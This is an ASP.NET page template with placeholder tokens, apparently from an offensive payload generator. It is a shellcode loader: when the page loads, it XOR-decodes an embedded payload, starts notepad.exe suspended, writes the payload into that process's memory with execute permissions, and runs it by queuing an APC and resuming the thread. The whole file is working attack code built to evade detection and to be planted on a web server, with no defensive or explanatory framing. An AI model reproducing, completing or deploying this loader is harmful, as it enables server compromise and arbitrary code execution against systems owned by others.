<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
private delegate bool #CP_DEL#(string #N_PARAM#, string #C_PARAM#, IntPtr #PA_PARAM#, IntPtr #TA_PARAM#, bool #I_PARAM#, uint #F_PARAM#, IntPtr #E_PARAM#, string #D_PARAM#, ref #SI_STRUCT# #S1_PARAM#, out #PI_STRUCT# #P1_PARAM#);
private delegate IntPtr #VA_DEL#(IntPtr #H_PARAM#, IntPtr #A_PARAM#, uint #S_PARAM#, uint #AT_PARAM#, uint #P_PARAM#);
private delegate bool #WP_DEL#(IntPtr #H_PARAM#, IntPtr #B_PARAM#, byte[] #BU_PARAM#, uint #S_PARAM#, out IntPtr #BR_PARAM#);
private delegate IntPtr #QA_DEL#(IntPtr #T_PARAM#, IntPtr #A_PARAM#, IntPtr #D_PARAM#);
private delegate uint #RT_DEL#(IntPtr #T_PARAM#);

[StructLayout(LayoutKind.Sequential)]
public struct #SI_STRUCT# { public uint #CB_FLD#; public string #R_FLD#; public string #D_FLD#; public string #T_FLD#; public uint #X_FLD#; public uint #Y_FLD#; public uint #XS_FLD#; public uint #YS_FLD#; public uint #XCA_FLD#; public uint #YCA_FLD#; public uint #F_FLD#; public ushort #W_FLD#; public ushort #CB2_FLD#; public IntPtr #RE_FLD#; public IntPtr #H1_FLD#; public IntPtr #H2_FLD#; public IntPtr #H3_FLD#; }
[StructLayout(LayoutKind.Sequential)]
public struct #PI_STRUCT# { public IntPtr #PH_FLD#; public IntPtr #TH_FLD#; public uint #PID_FLD#; public uint #TID_FLD#; }

protected void Page_Load(object sender, EventArgs e) {
    byte[] #SHELLCODE_VAR# = new byte[] { #SHELLCODE# };
    for (int i = 0; i < #SHELLCODE_VAR#.Length; i++) { #SHELLCODE_VAR#[i] = (byte)(#SHELLCODE_VAR#[i] ^ #KEY#); }
    IntPtr #KERNEL32_HANDLE# = LoadLibrary("kernel32.dll");
    #CP_DEL# #CREATE_PROCESS_FUNC# = (#CP_DEL#)Marshal.GetDelegateForFunctionPointer(GetProcAddress(#KERNEL32_HANDLE#, "CreateProcessA"), typeof(#CP_DEL#));
    #VA_DEL# #VIRTUAL_ALLOC_EX_FUNC# = (#VA_DEL#)Marshal.GetDelegateForFunctionPointer(GetProcAddress(#KERNEL32_HANDLE#, "VirtualAllocEx"), typeof(#VA_DEL#));
    #WP_DEL# #WRITE_PROCESS_MEM_FUNC# = (#WP_DEL#)Marshal.GetDelegateForFunctionPointer(GetProcAddress(#KERNEL32_HANDLE#, "WriteProcessMemory"), typeof(#WP_DEL#));
    #QA_DEL# #QUEUE_USER_APC_FUNC# = (#QA_DEL#)Marshal.GetDelegateForFunctionPointer(GetProcAddress(#KERNEL32_HANDLE#, "QueueUserAPC"), typeof(#QA_DEL#));
    #RT_DEL# #RESUME_THREAD_FUNC# = (#RT_DEL#)Marshal.GetDelegateForFunctionPointer(GetProcAddress(#KERNEL32_HANDLE#, "ResumeThread"), typeof(#RT_DEL#));

    #SI_STRUCT# #STARTUP_INFO_VAR# = new #SI_STRUCT#();
    #PI_STRUCT# #PROCESS_INFO_VAR# = new #PI_STRUCT#();
    bool #SUCCESS_VAR# = #CREATE_PROCESS_FUNC#(null, "c:\\windows\\system32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref #STARTUP_INFO_VAR#, out #PROCESS_INFO_VAR#);
    if (#SUCCESS_VAR#) {
        IntPtr #REMOTE_ADDR_VAR# = #VIRTUAL_ALLOC_EX_FUNC#(#PROCESS_INFO_VAR#.#PH_FLD#, IntPtr.Zero, (uint)#SHELLCODE_VAR#.Length, 0x3000, 0x40);
        IntPtr #BYTES_WRITTEN_VAR#;
        #WRITE_PROCESS_MEM_FUNC#(#PROCESS_INFO_VAR#.#PH_FLD#, #REMOTE_ADDR_VAR#, #SHELLCODE_VAR#, (uint)#SHELLCODE_VAR#.Length, out #BYTES_WRITTEN_VAR#);
        #QUEUE_USER_APC_FUNC#(#REMOTE_ADDR_VAR#, #PROCESS_INFO_VAR#.#TH_FLD#, IntPtr.Zero);
        #RESUME_THREAD_FUNC#(#PROCESS_INFO_VAR#.#TH_FLD#);
    }
}
[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string #LIB_NAME_PARAM#);
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr #MOD_HANDLE_PARAM#, string #PROC_NAME_PARAM#);
</script>
